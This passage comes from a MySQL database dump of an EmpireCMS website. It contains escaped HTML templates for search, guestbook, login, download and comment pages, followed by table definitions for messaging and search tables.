value=\\\"title,smalltext,newstext,writer\\\" />\r\n															不限</td>\r\n													</tr>\r\n												</table>\r\n													<br />\r\n													<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"6\\\" cellspacing=\\\"0\\\">\r\n														<tr bgcolor=\\\"#F4F4F4\\\">\r\n															<td><strong>时间限制</strong><font color=\\\"#666666\\\">(0000-00-00为不限制)</font></td>\r\n														</tr>\r\n														<tr>\r\n															<td height=\\\"30\\\" valign=\\\"top\\\">从\r\n																<input name=\\\"starttime\\\" type=\\\"text\\\" value=\\\"0000-00-00\\\" size=\\\"12\\\" onclick=\\\"setday(this)\\\" />\r\n																到\r\n																<input name=\\\"endtime\\\" type=\\\"text\\\" value=\\\"0000-00-00\\\" size=\\\"12\\\" onclick=\\\"setday(this)\\\" />\r\n																之间的数据</td>\r\n														</tr>\r\n														<tr>\r\n															<td bgcolor=\\\"#F4F4F4\\\"><strong>价格限制</strong><font color=\\\"#666666\\\">(商城模型中有效,0为不限制)</font></td>\r\n														</tr>\r\n														<tr>\r\n															<td>从\r\n																<input name=\\\"startprice\\\" type=\\\"text\\\" id=\\\"startprice\\\" value=\\\"0\\\" size=\\\"6\\\" />\r\n																到\r\n																<input name=\\\"endprice\\\" type=\\\"text\\\" id=\\\"endprice\\\" value=\\\"0\\\" size=\\\"6\\\" />\r\n																元之间</td>\r\n														</tr>\r\n												</table></td>\r\n											<td valign=\\\"top\\\"><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"6\\\" cellpadding=\\\"0\\\">\r\n													<tr>\r\n														<td><select name=\\\"classid\\\" size=\\\"8\\\" id=\\\"select2\\\" style=\\\"width: 100%;height:112px\\\">\r\n																<option value=\\\"0\\\" selected=\\\"selected\\\">所有栏目</option>\r\n															[!--class--]\r\n          \r\n														</select></td>\r\n													</tr>\r\n												</table>\r\n													<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"6\\\" cellspacing=\\\"0\\\">\r\n														<tr>\r\n															<td bgcolor=\\\"#F4F4F4\\\"><strong>结果显示</strong></td>\r\n														</tr>\r\n														<tr>\r\n															<td height=\\\"30\\\"><select name=\\\"orderby\\\" id=\\\"select4\\\">\r\n																	<option value=\\\"\\\">按发布日期</option>\r\n																	<option value=\\\"id\\\">信息ID</option>\r\n																	<option value=\\\"plnum\\\">评论数</option>\r\n																	<option value=\\\"onclick\\\">人气</option>\r\n																	<option value=\\\"totaldown\\\">下载数</option>\r\n																</select>\r\n																	<select name=\\\"myorder\\\" id=\\\"select5\\\">\r\n																		<option value=\\\"0\\\">倒序排列</option>\r\n																		<option value=\\\"1\\\">顺序排列</option>\r\n																	</select>\r\n															</td>\r\n														</tr>\r\n												</table></td>\r\n										</tr>\r\n									</table>\r\n								<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"4\\\" cellspacing=\\\"0\\\">\r\n										<tr>\r\n											<td>关键字：\r\n												<input name=\\\"keyboard\\\" type=\\\"text\\\" id=\\\"keyboard2\\\" size=\\\"60\\\" />\r\n													<input type=\\\"submit\\\" name=\\\"Submit22\\\" value=\\\"搜索\\\" />\r\n											</td>\r\n										</tr>\r\n									</table>\r\n							</form></td>\r\n						</tr>\r\n					</table></td>\r\n				</tr>\r\n			</table></td>\r\n	</tr>\r\n</table>\r\n[!--temp.footer--]\r\n</body>\r\n</html>','<table border=0 cellpadding=3 cellspacing=1><form name=search_js1 method=post action=\'[!--news.url--]e/search/index.php\' onsubmit=\'return search_check(document.search_js1);\'><tr><td><div align=center>搜索: <select name=show><option value=title>标题</option><option value=smalltext>简介</option><option value=newstext>内容</option><option value=writer>作者</option><option value=title,smalltext,newstext,writer>搜索全部</option></select><select name=classid><option value=0>所有栏目</option>[!--class--]</select><input name=keyboard type=text size=13><input type=submit name=Submit value=搜索></div></td></tr></form></table>','<table width=99% border=0 cellpadding=3 cellspacing=1><form name=search_js2 method=post action=\'[!--news.url--]e/search/index.php\' onsubmit=\'return search_check(document.search_js2);\'><tr><td height=25><div align=center>关键字: <input name=keyboard type=text size=13></div></td></tr><tr><td><div align=center>范围: <select name=show><option value=title>标题</option><option value=smalltext>简介</option><option value=newstext>内容</option><option value=writer>作者</option><option value=title,smalltext,newstext,writer>搜索全部</option></select></div></td></tr><tr><td><div align=center>栏目:<select name=classid><option value=0>所有栏目</option>[!--class--]</select></div></td></tr><tr><td><div align=center><input type=submit name=Submit value=搜索></div></td></tr></form></table>','[!--empirenews.listtemp--]<li><a href=\"[!--titleurl--]\" title=\"[!--oldtitle--]\">[!--title--]</a></li>[!--empirenews.listtemp--]','[ <a href=\\\"#ecms\\\" onclick=\\\"window.open(\\\'[!--down.url--]\\\',\\\'\\\',\\\'width=300,height=300,resizable=yes\\\');\\\">[!--down.name--]</a> ]','[ <a href=\\\"#ecms\\\" onclick=\\\"window.open(\\\'[!--down.url--]\\\',\\\'\\\',\\\'width=300,height=300,resizable=yes\\\');\\\">[!--down.name--]</a> ]','页次：[!--thispage--]/[!--pagenum--]&nbsp;每页[!--lencord--]&nbsp;总数[!--num--]&nbsp;&nbsp;&nbsp;&nbsp;[!--pagelink--]&nbsp;&nbsp;&nbsp;&nbsp;转到:[!--options--]','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n<title>留言板 - Powered by EmpireCMS</title>\r\n<meta name=\\\"keywords\\\" content=\\\"[!--bname--]\\\" />\r\n<meta name=\\\"description\\\" content=\\\"[!--bname--]\\\" />\r\n<link href=\\\"[!--news.url--]skin/default/css/style.css\\\" rel=\\\"stylesheet\\\" type=\\\"text/css\\\" />\r\n<script type=\\\"text/javascript\\\" src=\\\"[!--news.url--]skin/default/js/tabs.js\\\"></script>\r\n</head>\r\n<body class=\\\"listpage\\\">\r\n[!--temp.dtheader--]\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"10\\\" cellpadding=\\\"0\\\">\r\n<tr valign=\\\"top\\\">\r\n<td class=\\\"list_content\\\"><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"position\\\">\r\n<tr>\r\n<td>现在的位置：<a href=../../../>首页</a>&nbsp;>&nbsp;[!--bname--]\r\n</td>\r\n</tr>\r\n</table><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"box\\\">\r\n	<tr>\r\n		<td><table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"3\\\" cellspacing=\\\"2\\\">\r\n			<tr>\r\n				<td align=\\\"center\\\" bgcolor=\\\"#E1EFFB\\\"><strong>[!--bname--]</strong></td>\r\n			</tr>\r\n			<tr>\r\n				<td align=\\\"left\\\" valign=\\\"top\\\"><table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"4\\\" cellspacing=\\\"0\\\" bgcolor=\\\"#FFFFFF\\\">\r\n						<tr>\r\n							<td height=\\\"100%\\\" valign=\\\"top\\\" bgcolor=\\\"#FFFFFF\\\"> [!--empirenews.listtemp--]\r\n								<table width=\\\"92%\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"4\\\" cellspacing=\\\"1\\\" bgcolor=\\\"#F4F9FD\\\" class=\\\"tableborder\\\">\r\n										<tr class=\\\"header\\\">\r\n											<td width=\\\"55%\\\" height=\\\"23\\\">发布者: [!--name--] </td>\r\n											<td width=\\\"45%\\\">发布时间: [!--lytime--] </td>\r\n										</tr>\r\n										<tr bgcolor=\\\"#FFFFFF\\\">\r\n											<td height=\\\"23\\\" colspan=\\\"2\\\"><table border=\\\"0\\\" width=\\\"100%\\\" cellspacing=\\\"1\\\" cellpadding=\\\"8\\\" bgcolor=\\\'#cccccc\\\'>\r\n													<tr>\r\n														<td width=\\\'100%\\\' bgcolor=\\\'#FFFFFF\\\' style=\\\'word-break:break-all\\\'> [!--lytext--] </td>\r\n													</tr>\r\n												</table>\r\n												[!--start.regbook--]\r\n												<table width=\\\"100%\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\">\r\n													<tr>\r\n														<td><img src=\\\"../../data/images/regb.gif\\\" width=\\\"18\\\" height=\\\"18\\\" /><strong><font color=\\\"#FF0000\\\">回复:</font></strong> [!--retext--] </td>\r\n													</tr>\r\n												</table>\r\n												[!--end.regbook--] </td>\r\n										</tr>\r\n									</table>\r\n								<br />\r\n								[!--empirenews.listtemp--]\r\n								<table width=\\\"92%\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"4\\\" cellspacing=\\\"1\\\">\r\n									<tr>\r\n										<td>分页: [!--listpage--]</td>\r\n									</tr>\r\n								</table>\r\n								<form action=\\\"../../enews/index.php\\\" method=\\\"post\\\" name=\\\"form1\\\" id=\\\"form1\\\">\r\n									<table width=\\\"92%\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"4\\\" cellspacing=\\\"1\\\"class=\\\"tableborder\\\">\r\n										<tr class=\\\"header\\\">\r\n											<td colspan=\\\"2\\\" bgcolor=\\\"#F4F9FD\\\"><strong>请您留言:</strong></td>\r\n										</tr>\r\n										<tr bgcolor=\\\"#FFFFFF\\\">\r\n											<td width=\\\"20%\\\">姓名:</td>\r\n											<td width=\\\"722\\\" height=\\\"23\\\"><input name=\\\"name\\\" type=\\\"text\\\" id=\\\"name\\\" />\r\n												*</td>\r\n										</tr>\r\n										<tr bgcolor=\\\"#FFFFFF\\\">\r\n											<td>联系邮箱:</td>\r\n											<td height=\\\"23\\\"><input name=\\\"email\\\" type=\\\"text\\\" id=\\\"email\\\" />\r\n												*</td>\r\n										</tr>\r\n										<tr bgcolor=\\\"#FFFFFF\\\">\r\n											<td>联系电话:</td>\r\n											<td height=\\\"23\\\"><input name=\\\"mycall\\\" type=\\\"text\\\" id=\\\"mycall\\\" /></td>\r\n										</tr>\r\n										<tr bgcolor=\\\"#FFFFFF\\\">\r\n											<td>留言内容(*):</td>\r\n											<td height=\\\"23\\\"><textarea name=\\\"lytext\\\" cols=\\\"60\\\" rows=\\\"12\\\" id=\\\"lytext\\\"></textarea></td>\r\n										</tr>\r\n										<tr bgcolor=\\\"#FFFFFF\\\">\r\n											<td height=\\\"23\\\">&nbsp;</td>\r\n											<td height=\\\"23\\\"><input type=\\\"submit\\\" name=\\\"Submit3\\\" value=\\\"提交\\\" />\r\n											<input type=\\\"reset\\\" name=\\\"Submit22\\\" value=\\\"重置\\\" />\r\n											<input name=\\\"enews\\\" type=\\\"hidden\\\" id=\\\"enews\\\" value=\\\"AddGbook\\\" /></td>\r\n										</tr>\r\n									</table>\r\n								</form></td>\r\n						</tr>\r\n				</table></td>\r\n			</tr>\r\n		</table></td>\r\n	</tr>\r\n</table></td>\r\n</tr>\r\n</table>\r\n[!--temp.footer--]\r\n</body>\r\n</html>','<html>\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\">\r\n<title>登陆</title>\r\n<LINK href=\\\"../../data/images/qcss.css\\\" rel=stylesheet>\r\n</head>\r\n<body bgcolor=\\\"#ededed\\\" topmargin=\\\"0\\\">\r\n<table border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\">\r\n  <form name=login method=post action=\\\"../../member/doaction.php\\\">\r\n    <input type=hidden name=enews value=login>\r\n    <input type=hidden name=prtype value=1>\r\n    <tr> \r\n      <td height=\\\"23\\\" align=\\\"center\\\">\r\n      <div align=\\\"left\\\">\r\n      用户名：<input name=\\\"username\\\" type=\\\"text\\\" size=\\\"8\\\">&nbsp;\r\n      密码：<input name=\\\"password\\\" type=\\\"password\\\" size=\\\"8\\\">\r\n      <select name=\\\"lifetime\\\" id=\\\"lifetime\\\">\r\n         <option value=\\\"0\\\">不保存</option>\r\n         <option value=\\\"3600\\\">一小时</option>\r\n         <option value=\\\"86400\\\">一天</option>\r\n         <option value=\\\"2592000\\\">一个月</option>\r\n         <option value=\\\"315360000\\\">永久</option>\r\n      </select>&nbsp;\r\n      <input type=\\\"submit\\\" name=\\\"Submit\\\" value=\\\"登陆\\\">&nbsp;\r\n      <input type=\\\"button\\\" name=\\\"Submit2\\\" value=\\\"注册\\\" onclick=\\\"window.open(\\\'../register/\\\');\\\">\r\n      </div>\r\n      </td>\r\n    </tr>\r\n  </form>\r\n</table>\r\n</body>\r\n</html>\r\n[!--empirenews.template--]\r\n<html>\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\">\r\n<title>登陆</title>\r\n<LINK href=\\\"../../data/images/qcss.css\\\" rel=stylesheet>\r\n</head>\r\n<body bgcolor=\\\"#ededed\\\" topmargin=\\\"0\\\">\r\n<table border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\">\r\n    <tr>\r\n	<td height=\\\"23\\\" align=\\\"center\\\">\r\n	<div align=\\\"left\\\">\r\n		&raquo;&nbsp;<font color=red><b>[!--username--]</b></font>&nbsp;&nbsp;<a href=\\\"../my/\\\" target=\\\"_parent\\\">[!--groupname--]</a>&nbsp;[!--havemsg--]&nbsp;<a href=\\\"[!--news.url--]e/space/?userid=[!--userid--]\\\" target=_blank>我的空间</a>&nbsp;&nbsp;<a href=\\\"../msg/\\\" target=_blank>短信息</a>&nbsp;&nbsp;<a href=\\\"../fava/\\\" target=_blank>收藏夹</a>&nbsp;&nbsp;<a href=\\\"../cp/\\\" target=\\\"_parent\\\">控制面板</a>&nbsp;&nbsp;<a href=\\\"../../member/doaction.php?enews=exit&prtype=9\\\" onclick=\\\"return confirm(\\\'确认要退出?\\\');\\\">退出</a> \r\n	</div>\r\n	</td>\r\n    </tr>\r\n</table>\r\n</body>\r\n</html>',50,'Y-m-d H:i:s','<form name=login method=post action=\\\"[!--news.url--]e/member/doaction.php\\\">\r\n    <input type=hidden name=enews value=login>\r\n    <input type=hidden name=ecmsfrom value=9>\r\n    用户名：<input name=\\\"username\\\" type=\\\"text\\\" class=\\\"inputText\\\" size=\\\"16\\\" />&nbsp;\r\n    密码：<input name=\\\"password\\\" type=\\\"password\\\" class=\\\"inputText\\\" size=\\\"16\\\" />&nbsp;\r\n    <input type=\\\"submit\\\" name=\\\"Submit\\\" value=\\\"登陆\\\" class=\\\"inputSub\\\" />&nbsp;\r\n    <input type=\\\"button\\\" name=\\\"Submit2\\\" value=\\\"注册\\\" class=\\\"inputSub\\\" onclick=\\\"window.open(\\\'[!--news.url--]e/member/register/\\\');\\\" />\r\n</form>\r\n[!--empirenews.template--]\r\n&raquo;&nbsp;<font color=red><b>[!--username--]</b></font>&nbsp;&nbsp;<a href=\\\"[!--news.url--]e/member/my/\\\" target=\\\"_parent\\\">[!--groupname--]</a>&nbsp;[!--havemsg--]&nbsp;<a href=\\\"[!--news.url--]e/space/?userid=[!--userid--]\\\" target=_blank>我的空间</a>&nbsp;&nbsp;<a href=\\\"[!--news.url--]e/member/msg/\\\" target=_blank>短信息</a>&nbsp;&nbsp;<a href=\\\"[!--news.url--]e/member/fava/\\\" target=_blank>收藏夹</a>&nbsp;&nbsp;<a href=\\\"[!--news.url--]e/member/cp/\\\" target=\\\"_parent\\\">控制面板</a>&nbsp;&nbsp;<a href=\\\"[!--news.url--]e/member/doaction.php?enews=exit&ecmsfrom=9\\\" onclick=\\\"return confirm(\\\'确认要退出?\\\');\\\">退出</a>','<html>\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\">\r\n<title>[!--pagetitle--]</title>\r\n<meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\">\r\n<meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\">\r\n<link href=\\\"../../data/images/qcss.css\\\" rel=\\\"stylesheet\\\" type=\\\"text/css\\\">\r\n</head>\r\n<body>\r\n<br>\r\n<br>\r\n<br>\r\n<br>\r\n<table align=\\\"center\\\" width=\\\"100%\\\">\r\n  <tr> \r\n    <td height=\\\"32\\\" align=center>\r\n	<a href=\\\"[!--down.url--]\\\" title=\\\"[!--title--] －[!--down.name--]\\\">\r\n	<img src=\\\"../../data/images/download.jpg\\\" border=0>\r\n	</a>\r\n	</td>\r\n  </tr>\r\n  <tr> \r\n    <td align=center>(点击下载)</td>\r\n  </tr>\r\n</table>\r\n<br>\r\n</body>\r\n</html>','[!--empirenews.listtemp--] \r\n      <table width=\\\"100%\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\" style=\\\"word-break:break-all; word-wrap:break-all;\\\">\r\n        <tr> \r\n          <td height=\\\"30\\\"><span class=\\\"name\\\">本站网友 [!--username--]</span> <font color=\\\"#666666\\\">ip:[!--plip--]</font></td>\r\n          <td><div align=\\\"right\\\"><font color=\\\"#666666\\\">[!--pltime--] 发表</font></div></td>\r\n        </tr>\r\n        <tr valign=\\\"top\\\"> \r\n          <td height=\\\"50\\\" colspan=\\\"2\\\" class=\\\"text\\\">[!--pltext--]</td>\r\n        </tr>\r\n        <tr> \r\n          <td height=\\\"30\\\">&nbsp;</td>\r\n          <td><div align=\\\"right\\\" class=\\\"re\\\"> \r\n              <a href=\\\"JavaScript:makeRequest(\\\'[!--news.url--]e/pl/doaction.php?enews=DoForPl&plid=[!--plid--]&classid=[!--classid--]&id=[!--id--]&dopl=1&doajax=1&ajaxarea=zcpldiv[!--plid--]\\\',\\\'EchoReturnedText\\\',\\\'GET\\\',\\\'\\\');\\\">支持</a>[<span id=\\\"zcpldiv[!--plid--]\\\">[!--zcnum--]</span>]&nbsp; \r\n              <a href=\\\"JavaScript:makeRequest(\\\'[!--news.url--]e/pl/doaction.php?enews=DoForPl&plid=[!--plid--]&classid=[!--classid--]&id=[!--id--]&dopl=0&doajax=1&ajaxarea=fdpldiv[!--plid--]\\\',\\\'EchoReturnedText\\\',\\\'GET\\\',\\\'\\\');\\\">反对</a>[<span id=\\\"fdpldiv[!--plid--]\\\">[!--fdnum--]</span>]\r\n            </div></td>\r\n        </tr>\r\n      </table>\r\n      <table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n        <tr>\r\n          <td background=\\\"[!--news.url--]skin/default/images/plhrbg.gif\\\"></td>\r\n        </tr>\r\n      </table>\r\n[!--empirenews.listtemp--]','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n<title>搜索 - Powered by EmpireCMS</title>\r\n<link href=\\\"[!--news.url--]skin/default/css/style.css\\\" rel=\\\"stylesheet\\\" type=\\\"text/css\\\" />\r\n<script type=\\\"text/javascript\\\" src=\\\"[!--news.url--]skin/default/js/tabs.js\\\"></script>\r\n<style type=\\\"text/css\\\">\r\n<!--\r\n.r {\r\ndisplay:inline;\r\nfont-weight:normal;\r\nmargin:0;\r\nfont-size:16px;\r\nmargin-top:10px;\r\n}\r\n.a{color:green}\r\n.fl{color:#77c}\r\n-->\r\n</style>\r\n</head>\r\n<body class=\\\"listpage\\\">\r\n[!--temp.dtheader--]\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"10\\\" cellpadding=\\\"0\\\">\r\n	<tr valign=\\\"top\\\">\r\n		<td class=\\\"list_content\\\"><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"position\\\">\r\n				<tr>\r\n					<td>现在的位置：<a href=\\\"[!--news.url--]\\\">首页</a>&nbsp;>&nbsp;搜索</td>\r\n				</tr>\r\n			</table>\r\n			<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"box\\\">\r\n				<tr>\r\n					<td><form action=\\\'index.php\\\' method=\\\"GET\\\" name=\\\"search_news\\\" id=\\\"search_news\\\">\r\n							<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"6\\\" cellpadding=\\\"0\\\">\r\n								<tr>\r\n									<td height=\\\"32\\\">关键字：\r\n										<input name=\\\"keyboard\\\" type=\\\"text\\\" id=\\\"keyboard\\\" value=\\\"[!--keyboard--]\\\" size=\\\"42\\\" />\r\n                    <select name=\\\"field\\\" id=\\\"field\\\">\r\n                      <option value=\\\"1\\\">全文</option>\r\n                      <option value=\\\"2\\\">标题</option>\r\n                      <option value=\\\"3\\\">内容</option>\r\n                    </select> \r\n                    <input type=\\\"submit\\\" name=\\\"Submit22\\\" value=\\\"搜索\\\" />\r\n                    <font color=\\\"#666666\\\">(多个关键字请用&quot;空格&quot;隔开)</font> </td>\r\n								</tr>\r\n							</table>\r\n						</form>\r\n						<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"6\\\">\r\n							<tr>\r\n								<td>系统搜索到约有<strong>[!--num--]</strong>项符合<strong>[!--keyboard--]</strong>的查询结果</td>\r\n							</tr>\r\n						</table>\r\n						[!--empirenews.listtemp--]\r\n						<h2 class=\\\"r\\\"><span>[!--no.num--].</span> <a class=\\\"l\\\" href=\\\"[!--titleurl--]\\\" target=\\\"_blank\\\">[!--title--]</a></h2>\r\n						<table width=\\\"80%\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\">\r\n							<tbody>\r\n							<tr>\r\n								<td>[!--smalltext--]</td>\r\n							</tr>\r\n							<tr>\r\n								<td><span class=\\\"a\\\">[!--titleurl--] - [!--newstime--]</span></td>\r\n							</tr>\r\n							<tr>\r\n								<td>&nbsp;</td>\r\n							</tr>\r\n							</tbody>\r\n						</table>\r\n						[!--empirenews.listtemp--]\r\n						<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"list_page\\\">\r\n							<tr>\r\n								<td>[!--listpage--]</td>\r\n							</tr>\r\n						</table></td>\r\n				</tr>\r\n			</table></td>\r\n	</tr>\r\n</table>\r\n[!--temp.footer--]\r\n</body>\r\n</html>',120,'Y-m-d H:i:s');
/*!40000 ALTER TABLE `libang_enewspubtemp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspubvar`
--

DROP TABLE IF EXISTS `libang_enewspubvar`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspubvar` (
  `varid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `myvar` varchar(60) NOT NULL DEFAULT '',
  `varname` varchar(20) NOT NULL DEFAULT '',
  `varvalue` text NOT NULL,
  `varsay` varchar(255) NOT NULL DEFAULT '',
  `myorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tocache` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`varid`),
  UNIQUE KEY `varname` (`varname`),
  KEY `classid` (`classid`),
  KEY `tocache` (`tocache`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspubvar`
--

LOCK TABLES `libang_enewspubvar` WRITE;
/*!40000 ALTER TABLE `libang_enewspubvar` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewspubvar` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewspubvarclass`
--

DROP TABLE IF EXISTS `libang_enewspubvarclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewspubvarclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(30) NOT NULL DEFAULT '',
  `classsay` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewspubvarclass`
--

LOCK TABLES `libang_enewspubvarclass` WRITE;
/*!40000 ALTER TABLE `libang_enewspubvarclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewspubvarclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsqmsg`
--

DROP TABLE IF EXISTS `libang_enewsqmsg`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsqmsg` (
  `mid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(80) NOT NULL DEFAULT '',
  `msgtext` text NOT NULL,
  `haveread` tinyint(1) NOT NULL DEFAULT '0',
  `msgtime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `to_username` varchar(30) NOT NULL DEFAULT '',
  `from_userid` int(10) unsigned NOT NULL DEFAULT '0',
  `from_username` varchar(30) NOT NULL DEFAULT '',
  `isadmin` tinyint(1) NOT NULL DEFAULT '0',
  `issys` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`mid`),
  KEY `to_username` (`to_username`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsqmsg`
--

LOCK TABLES `libang_enewsqmsg` WRITE;
/*!40000 ALTER TABLE `libang_enewsqmsg` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsqmsg` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewssearch`
--

DROP TABLE IF EXISTS `libang_enewssearch`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewssearch` (
  `searchid` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `keyboard` varchar(255) NOT NULL DEFAULT '',
  `searchtime` int(10) unsigned NOT NULL DEFAULT '0',
  `searchclass` varchar(255) NOT NULL DEFAULT '',
  `result_num` int(10) unsigned NOT NULL DEFAULT '0',
  `searchip` varchar(20) NOT NULL DEFAULT '',
  `classid` varchar(255) NOT NULL DEFAULT '',
  `onclick` int(10) unsigned NOT NULL DEFAULT '0',
  `orderby` varchar(30) NOT NULL DEFAULT '0',
  `myorder` tinyint(1) NOT NULL DEFAULT '0',
  `checkpass` varchar(32) NOT NULL DEFAULT '',
  `tbname` varchar(60) NOT NULL DEFAULT '',
  `tempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `iskey` tinyint(1) NOT NULL DEFAULT '0',
  `andsql` text NOT NULL,
  `trueclassid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`searchid`),
  KEY `checkpass` (`checkpass`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewssearch`
--

LOCK TABLES `libang_enewssearch` WRITE;
/*!40000 ALTER TABLE `libang_enewssearch` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewssearch` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewssearchall`
--

DROP TABLE IF EXISTS `libang_enewssearchall`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewssearchall` (
  `sid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `title` text NOT NULL,
  `infotime` int(10) unsigned NOT NULL DEFAULT '0',
  `infotext` mediumtext NOT NULL,
  PRIMARY KEY (`sid`),
  KEY `id` (`id`,`classid`,`infotime`),
  FULLTEXT KEY `title` (`title`,`infotext`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewssearchall`
--

LOCK TABLES `libang_enewssearchall` WRITE;
/*!40000 ALTER TABLE `libang_enewssearchall` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewssearchall` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewssearchall_load`
--

DROP TABLE IF EXISTS `libang_enewssearchall_load`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewssearchall_load` (
  `lid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tbname` varchar(60) NOT NULL DEFAULT '',
  `titlefield` varchar(30) NOT NULL DEFAULT '',
  `infotextfield` varchar(30) NOT NULL DEFAULT '',
  `smalltextfield` varchar(30) NOT NULL DEFAULT '',
  `loadnum` smallint(5) unsigned NOT NULL DEFAULT '0',
  `lasttime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastid` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`lid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewssearchall_load`
--

LOCK TABLES `libang_enewssearchall_load` WRITE;
/*!40000 ALTER TABLE `libang_enewssearchall_load` DISABLE KEYS */;
